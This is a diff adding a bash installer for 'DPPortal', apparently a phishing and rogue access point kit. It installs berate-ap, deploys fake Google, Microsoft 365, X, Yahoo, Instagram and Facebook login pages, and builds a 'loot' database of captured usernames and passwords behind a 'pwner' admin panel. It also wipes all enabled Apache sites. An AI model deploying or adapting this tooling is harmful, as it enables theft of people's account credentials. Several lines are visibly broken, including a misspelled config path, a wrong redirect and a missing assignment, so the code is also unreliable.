@@ -1,0 +1,585 @@
+#!/bin/bash -x
+
+#####Log start time of install script in seconds
+
+scriptStart=$(date +%s)
+
+
+#####Setting varz and spitting barz#####
+
+#Set sciptempls for colouring echo lines
+warn="\e[1;31m"      # warning (red)
+info="\e[1;34m"      # info (blue)
+q="\e[1;32m"         # questions (green)
+
+
+###Some more colour and formatting vars, some may become redundant as I continue to dev and tidy up my project
+_bold=$(tput bold)
+_underline=$(tput sgr 0 1)
+_reset=$(tput sgr0)
+_purple=$(tput setaf 171)
+_red=$(tput setaf 1)
+_green=$(tput setaf 76)
+_tan=$(tput setaf 3)
+_blue=$(tput setaf 38)
+
+
+function initBlurb() {
+
+	getUserConsent
+
+	echo -e "$info\nGathering some info...\n"
+    
+    sleep 2
+    
+    echo -e "$info\nBuilding working directories...\n\n"
+
+	#Create base directories
+	mkdir -p /etc/dpportal
+	mkdir -p /etc/dpportal/run
+	mkdir -p /etc/dpportal/config
+    mkdir -p /etc/dpportal/logs
+    
+    #Log for installation
+    touch /etc/dpportal/logs/install.log
+    
+    #Var it
+	installLog=/etc/dpportal/logs/install.log
+
+	#Check if running as root first
+	scriptUser=$(id -u)
+	
+    if [[ $scriptUser -ne 0 ]]; then
+		echo -e "$warn\nThis script needs to be run with sudo privileges. Exiting, no changes have been made...\n"
+		_die "You done fucked up, me be dipping!"
+	fi
+
+	echo -e "$info\nSetting charset for database creation...\n"
+	#DB char set
+	export LC_CTYPE=C
+	export LANG=C
+
+
+	echo -e "$info\nSetting variables...\n"
+	#Define install dir
+	installDir=$(echo $PWD)
+
+	#Current user
+	curUser=$(who | awk '{print $1}' | head -1)
+
+	#Config dir set
+	configDir=/etc/dpportal/config
+
+	#Touch database config file
+	touch $configDir/db.cfg
+	dbcfgFile=$configDir/db.cfg
+	
+	#Ask to set site domain names
+	echo -e "$qWould you like to use a custom domain for the portal site? If so enter here, if blank default of captive.dpportal.io will be used."
+	read -s captiveDomainAns
+	if [[ -z "$captiveDomainAns" ]]; then
+		captiveDomain="captive.dpportal.io"
+	else
+		captiveDomain=$captiveDomainAns
+		echo "User specified custom captive portal domain of $captiveDomainAns" >> $installLog
+		touch /etc/dpportal/config/customdomain.conf
+		echo "captive $captiveDomainAns" >> /etc/dpportal/config/customdomain.conf
+	fi
+	
+	echo -e "$qWould you like to use a custom domain for the loot/admin panel site? If so enter here, if blank default of loot.dpportal.io will be used."
+	read -s lootDomainAns
+	if [[ -z "$lootDomainAns" ]]; then
+		lootDomain="loot.dpportal.io"
+	else
+		lootDomain=$lootDomainAns
+		echo "User specified custom loot portal domain of $lootDomainAns" >> $installLog
+		touch /etc/dpportal/config/customdomain.conf
+	fi
+	
+	
+
+}
+
+
+#Generate random DB password
+
+function generatePassword()
+{
+    echo "$(openssl rand -base64 12)"
+}
+
+
+function setDBDetails() {
+
+	#DB vars set calling random password generator function to set db password
+	DB_HOST='127.0.0.1'
+	DB_NAME='DPPortal'
+	DB_USER='dpuser'
+	DB_PASS=$(generatePassword)
+
+	echo "DBHOST=$DB_HOST" > $dbcfgFile
+	echo "DBNAME=$DB_NAME" >> $dbcfgFile
+	echo "DBUSER=$DB_USER" >> $dbcfgFile
+	echo "DBPASS=$DB_PASS" >> $dbcfgFile
+	
+
+}
+
+
+function _printPoweredBy()
+{
+    cat <<"EOF"
+
+
+
+  _____  _____        _____   ____  _____ _______       _      
+ |  __ \|  __ \      |  __ \ / __ \|  __ \__   __|/\   | |     
+ | |  | | |__) |_____| |__) | |  | | |__) | | |  /  \  | |     
+ | |  | |  ___/______|  ___/| |  | |  _  /  | | / /\ \ | |     
+ | |__| | |          | |    | |__| | | \ \  | |/ ____ \| |____ 
+ |_____/|_|          |_|     \____/|_|  \_\ |_/_/    \_\______|
+                                                               
+
+  written by: Double_D
+  
+  INSTALLING "$@"
+
+
+
+
+################################################################
+EOF
+}
+
+
+#Function that prints arrow then arguement (just bells and whistles)
+function _arrow()
+{
+    printf "➜ $@\n"
+}
+
+function _success()
+{
+    printf "${_green}✔ %s${_reset}\n" "$@"
+}
+
+function _error() {
+    printf "${_red}✖ %s${_reset}\n" "$@"
+}
+
+function _die()
+{
+    _error "$@"
+    exit 1
+}
+
+function _safeExit()
+{
+    exit 0
+}
+
+
+function getUserConsent()
+{
+
+	echo -e "$infoThis will install DPPortal, all it's content and dependant packages, do you wish to continue? (y/n)"
+	read -s -n 1 installConsent
+	if [[ "$installConsent" == "n" ]]; then
+		nowTime=$(date +%s)
+        elapSec=$((nowTime  - scriptStart))
+        secSince=$(echo $elapSec | sed 's/-//g')
+		echo -e "$warnYou have chosen not to install this tool $elapSec seconds after running the installation script."
+        echo -e "$info\nNgl you seem pretty indecisive.\n"
+        _die "I be dipping!"
+	fi
+	
+
+}
+
+
+function initAuthCreds() {
+
+	passMatch=0
+
+	#Setup credentials for display panel site authentication
+	valUser="pwner"
+    
+    adminAuthFilePath=/etc/dpportal/config/.htpasswd
+    touch $adminAuthFilePath
+    
+	#Loop input requests until passwords match
+	#passMatch=0
+	#while [[ $passMatch -ne 1 ]]
+	#do
+	while true; do
+    		#clear
+        	#_printPoweredBy
+		_arrow "In order to access the loot display panel you will need to login with a password, please create one here (minimum length 5 characters, no trailing or leading spaces and no special characters):"
+		
+        	#Password prompt 1
+        	read -r -s -p "Password: " dispPass
+		echo -e "\n\n"
+		sleep 0.5
+		
+        	#Password prompt 2
+        	read -r -s -p "Confirm password: " dispPassConf
+
+		#Check that passwords match and are nott empty
+		pLength=${#dispPass}
+        	if [[ $pLength -ge 5 ]]; then
+        		if [[ "$dispPass" != "$dispPassConf" ]]; then
+				echo -e "$warn\nThose passwords didn't match you wally!"
+ 			elif [[ "$dispPass" == "$dispPassConf" ]]; then
+        			valPass="$dispPass"
+            			passMatch=1
+            			break
+			else
+        			_arrow "Strange things be going on here."
+			fi
+		else
+        		echo -e "$warn\nYou password must be longer than that! Be sensible.\n"
+		fi
+
+    	#Loop condition is while password match flag is negative
+	done
+
+	echo $valPass | htpasswd -c -i /var/www/dppdisplay/.htpasswd $valUser
+	
+
+}
+
+
+
+#Function to create database and table if it doesnt exist already and grabs root password if needed
+function createDBStuff()
+{
+    SQL1="CREATE DATABASE ${DB_NAME};"
+    SQL2="CREATE USER '${DB_USER}'@'%' IDENTIFIED BY '${DB_PASS}';"
+    SQL3="GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO '${DB_USER}'@'%';"
+    SQL4="FLUSH PRIVILEGES;"
+    SQL5="CREATE TABLE loot(id INT AUTO_INCREMENT PRIMARY KEY NOT NULL,username VARCHAR(128) NOT NULL,password VARCHAR(60) NOT NULL,service VARCHAR(20) NOT NULL,datetimestamp VARCHAR(40) NOT NULL);"
+
+    if [ -f /root/.my.cnf ]; then
+    	echo -e "$info\nCreating MySQL user and database...\n"
+        $BIN_MYSQL -e "${SQL1}${SQL2}${SQL3}${SQL4}${SQL5}"
+        if [[ $? -eq 0 ]]; then
+        	clear
+            _printPoweredBy
+            echo -e "\n\n\n\n\n"
+            echo "host=$DB_HOST" > $dbcfgFile
+            echo "database=$DB_NAME" >> $dbcfgFile
+            echo "dbuser=$DB_USER" >> $dbcfgFile
+            echo "dbpass=$DB_PASS" >> $dbcfgFile
+            clear
+            _printPoweredBy
+            _success "Database $DB_NAME and user $DB_USER has been created with necessary permissions granted..."
+        else
+        	_error "There was a problem creating the database and/or user."
+            echo -e "$warn\nDo you want to exit the installer now or continue on with the install and troubleshoot the DB later?(y/n)\n"
+            read exitReply
+				if [ "$exitReply" = "y" ] | [ "$exitReply" = "Y" ]; then
+                	clear
+                    _printPoweredBy
+					echo "host=$DB_HOST" > $dbcfgFile
+					echo "database=$DB_NAME" >> $dbcfgFile
+					echo "dbuser=$DB_USER" >> $dbcfgFile
+					echo "dbpass=$DB_PASS" >> $dbcfgFile
+                    echo -e "$info\n\nYou have chosen to exit, the database config file has been created with values but you still need to check MySQL/MariaDB, exiting....\n\n"
+                    _safeExit
+                fi
+        fi
+    else
+        # If /root/.my.cnf doesn't exist then it'll ask for root password
+        _arrow "Please enter root MySQL/MariaDB user password!"
+        read rootPassword
+        echo -e "$info\nCreating MySQL user and database...\n"
+        $BIN_MYSQL -u root -p${rootPassword} -e "${SQL1}${SQL2}${SQL3}${SQL4}${SQL5}" >>$installLog 2>&1
+        sleep 2
+        if [[ $? -eq 0 ]]; then
+        	clear
+            _printPoweredBy
+            echo -e "\n\n\n\n\n"
+            echo "host=$DB_HOST" > $dbcfgFile
+            echo "database=$DB_NAME" >> $dbcfgFile
+            echo "dbuser=$DB_USER" >> $dbcfgFile
+            echo "dbpass=$DB_PASS" >> $dbcfgFile
+            _success "Database $DB_NAME and user $DB_USER has been created and necessary permissions have been granted..."
+        else
+        	_error "There was a problem creating the database and/or user."
+            echo -e "$warn\nDo you want to exit the installer now or continue on with the install and troubleshoot the DB later?(y/n)\n"
+            read exitReply
+			if [ "$exitReply" = "y" ] | [ "$exitReply" = "Y" ]; then
+				echo "host=$DB_HOST" > $dbcfgFile
+            	echo "database=$DB_NAME" >> $dbcfgFile
+            	echo "dbuser=$DB_USER" >> $dbcfgFile
+            	echo "dbpass=$DB_PASS" >> $dbcfgFile
+                clear
+                _printPoweredBy
+                echo -e "$info\n\nYou have chosen to exit, but the database config file has been created with values, you still need to check MySQL/MariaDB, exiting....\n\n"
+                _safeExit
+            fi
+        fi
+    fi
+}
+
+
+function setHostsFile()
+{
+
+	#Check for custom domains and apply if necessary
+	if [[ -f /etc/dpportal/config/customdomain.conf ]]; then
+	
+		doesCap=$(cat /etc/dpportal/config/customdoamin.conf | grep -c "^captive")
+		if [[ $doesCap -eq 1 ]]; then
+			customCapDom=$(cat /etc/dpportal/config/customdomain.conf | grep "^captive" | cut -d " " -f 2)
+			captiveDomain=$customCapDom
+		fi
+		
+		doesLoot=$(cat /etc/dpportal/config/customdomain.conf | grep -c "^loot")
+		if [[ $doesLoot -eq 1 ]]; then
+			customLootDom=$(cat /etc/dpportal/config/customdomain.conf | grep "^loot" > cut -d " " -f 2)
+			lootDomain=$customLootDomain
+		fi
+		
+	fi
+
+    #Copy Hosts file and preserve current POSIX permissions
+    cp --preserve /etc/hosts /etc/dpportal/config/dpphosts
+    
+    sleep 0.5
+    
+    #Add our sites to hosts file
+	sed -i '/^127.0.0.1*/a 127.0.0.1\	$captiveDomain\n127.0.1.2\	$lootDomain' /etc/dpportal/config/dpphosts
+	sleep 1
+}
+
+
+function setDatabasePHPConfig()
+{
+
+cd /var/www/dpportal/login/modules
+sed -i "s/DPDBPASSWORD/$DB_PASS/g" dbcfg.conf
+
+cp --preserve dbcfg.php /var/www/dppdisplay/
+
+
+}
+
+function checkPreReqs()
+{
+
+	#Check Apache installed
+    apacheP=$(dpkg --get-selections | grep -c 'apache2-bin')
+    
+    if [[ $apacheP -eq 0 ]]; then
+		apt update && apt install -y apache2 >>$installLog 2>&1
+		enableBasicAuth
+		
+	else
+		echo "Apache2 installed, enabling basic auth..." >>$installLog 2>&1
+		enableBasicAuth
+	fi
+
+    #Check for MySQL/MariaDB Server
+	isDBServer=$(dpkg -l | grep -e mysql-server -e mariadb-server -c)
+    if [[ $isDBServer -ge 1 ]]; then
+		#Check mysql binary exec location
+		BIN_MYSQL=$(which mysql)
+	else 
+		echo -e "$info\nInstalling MariaDB Server...\n"
+        apt update && apt install -y mariadb-server >>$installLog 2>&1
+        sleep 3
+		if [[ $? -ne 0 ]]; then
+            echo -e "$info\nCouldn't quite manage installation of MariaDB Server, now trying MySQL Server instead...\n"
+            apt install mysql-server >>$installLog 2>&1
+            if [[ $? -eq 0 ]]; then
+                echo -e "$info\nSuccessfully installaed MySQL Server."
+			else
+               	echo -e "$warn\nLooks like we couldn't install the database software, this is such a fundamental part of DPPortal that the installer must now exit until you can resolve the issue.\n"
+			fi
+		else
+            echo -e "$info\nSuccessfully installed MariaDB Server...\n"
+            sleep 1
+            echo -e "$infoContinuing with the portal installation..."
+		fi
+	fi
+
+
+	#Check if Apache has PHP enabled
+	apachePM=$(dpkg --get-selections | grep -c 'libapache2-mod-php')
+    phpPkgs=$(dpkg --get-selections | grep -c 'php')
+    	
+
+	if [ "$apachePM" -eq 0 ] && [ "$phpPkgs" -le 1 ]; then
+		apt update && apt install -y php libapache2-mod-php php-mysql >>$installLog 2>&1
+	fi
+
+	apacheRun=$(systemctl status apache2 | grep Active\:\ active)
+
+	if [[ ! -z $apacheRun ]]; then
+		echo -e "$info\nApache2 is not running. \nAttempting to start..."
+		systemctl start apache2 >>$installLog 2>&1
+		sleep 4
+		apacheRunNow$(systemctl status apache2 | grep Active\:\ active)
+		sleep 1
+		if [[ ! -z $apacheRunNow ]]; then
+			echo "There were problems starting Apache, you should look into that!"
+        else
+        	echo -e "$info\nEnabling digest authentication...\n"
+        	cd /etc/apache2/mods-available/
+            a2enmod auth_basic >>$installLog 2>&1
+            systemctl restart apache2
+            sleep 2
+		fi
+	fi
+
+	isBerate=$(dpkg --get-selections | grep -c 'berate-ap')
+	if [[ $isBerate -eq 0 ]]; then
+		apt update && apt install -y berate-ap >>$installLog 2>&1
+        if [[ $? -ne 0 ]]; then
+        	echo -e "$warn\nLooks like the command to install Berate_AP didn't exit with code 0\n" 
+            echo -e "$q\nShall we continue anyway? [yes/no]\n"
+            read contAnyAns
+            if [[ "$contAnyAns" != "yes" ]]; then
+            	clear
+				echo -e "$warn\nLooks like we're done here then, exiting...\n"
+                echo "Berate AP install failed!" >> $installLog
+                _die "Bye!"
+			fi
+		fi
+	fi
+
+}
+
+
+function enableBasicAuth() {
+
+apacheCFG="/etc/apache2/apache2.conf"
+
+cp "$apacheCFG" "${apacheCFG}.bak"
+
+
+awk '
+/<Directory \/var\/www\/>/ {in_block=1}
+in_block && /AllowOverride None/ {
+	sub(/AllowOverride None/, "AllowOverride AuthConfig")
+}
+in_block && /<\/Directory>/ {in_block=0}
+{print}
+' "$apacheCFG" > "${CONF_FILE}.tmp"
+
+mv "${CONF_FILE}.tmp" "$apacheCFG"
+
+#	IFS=$'\n'
+#	for $fileLine in $(cat "$apacheCFG")
+#	do
+#	if [[ $fileLine = *"<Directory /var/www/>"* ]]; then
+#		cTagOpen=1
+#	fi
+#	if [[ $fileLine = *"</Directory>"* ]]; then
+#		cTagOpen=0
+#	fi
+#	if [[ cTagOpen -eq 1 ]] && [[ $fileLine == "AllowOverride None" ]]
+
+
+}
+
+
+function installContent()
+{
+
+    #Log directories and files
+    
+    mkdir -p /var/log/apache2/dpportal
+	mkdir -p /var/log/apache2/dppdisplay
+
+    # !! Action moved to bootstrap functions '_pruneLogs()' and/or 'preFlight()'
+    #touch /etc/dpportal/logs/dpp-error.log
+    #touch /etc/dpportal/logs/dpp-output.log
+	
+	#Install fake portal site content
+    
+	rsync -rlptgoD  $installDir/data/* /var/www/
+
+	#Disable any current sites in Apache2
+    echo -e "$info\nDisabling existing sites running in Apache2\n"
+    rm -rf /etc/apache2/sites-enabled/*
+    systemctl reload apache2
+    sleep 2
+
+	#Install site configs
+    
+	rsync -r -l -p -t -g -o -D $installDir/config/sites/dpportal.conf /etc/apache2/sites-available/
+#	rsync -r -l -p -t -g -o -D $installDir/config/sites/dppoptions.conf /etc/apache2/sites-available/
+    rsync -r -l -p -t -g -o -D $installDir/config/sites/dppdisplay.conf /etc/apache2/sites-available/
+	
+	#Set site data ownership and permissions
+	chown -R www-data:www-data /var/www/dppdisplay
+	chmod -R a+x /var/www/dppdisplay
+	chown -R www-data:www-data /var/www/dpportal
+	chmod -R a+x /var/www/dpportal
+
+	
+    # Enable sites and reload Apache service
+    
+    a2ensite dpportal.conf
+#	a2ensite dppoptions.conf
+    a2ensite dppdisplay.conf
+    systemctl reload apache2
+    
+    #Make binary sym link
+    
+    ln -s /etc/dpportal/run/dpportal.sh /usr/bin/dpportal
+    
+
+}
+
+
+function insertSQLPass() {
+
+#Inserts SQL DB password to all the login.php files
+#Set portal dir
+phishyDir="/var/www/dpportal/login/websites/"
+
+sed -i "s/DPDBPASSWORD/$DB_PASS/g" "$phishyDir/google/login.php"
+sed -i "s/DPDBPASSWORD/$DB_PASS/g" "$phishyDir/m365/login.php"
+sed -i "s/DPDBPASSWORD/$DB_PASS/g" "$phishyDir/x/login.php"
+sed -i "s/DPDBPASSWORD/$DB_PASS/g" "$phishyDir/yahoo/login.php"
+sed -i "s/DPDBPASSWORD/$DB_PASS/g" "$phishyDir/instagram/login.php"
+sed -i "s/DPDBPASSWORD/$DB_PASS/g" "$phishyDir/facebook/login.php"
+
+
+
+}
+
+#Run all install functions in order
+clear
+_printPoweredBy "DP Portal"
+initBlurb
+sleep 1
+_printPoweredBy "Database details"
+sleep 1
+setDBDetails
+_printPoweredBy "Checking for pre-req packages...."
+sleep 1
+checkPreReqs
+_printPoweredBy "Setting admin panel credentials..."
+sleep 1
+initAuthCreds
+_printPoweredBy "Creating the database itself"
+sleep 1
+createDBStuff
+_printPoweredBy "Modding the hosts file..."
+sleep 1
+setHostsFile
+_printPoweredBy "Installing site content..."
+sleep 1
+installContent
+_printPoweredBy "Configuring PHP"
+sleep 1
+setDatabasePHPConfig
+_printPoweredBy "Tweaking your SQL nips..."
+sleep 1
+insertSQLPass
+sleep 1
+
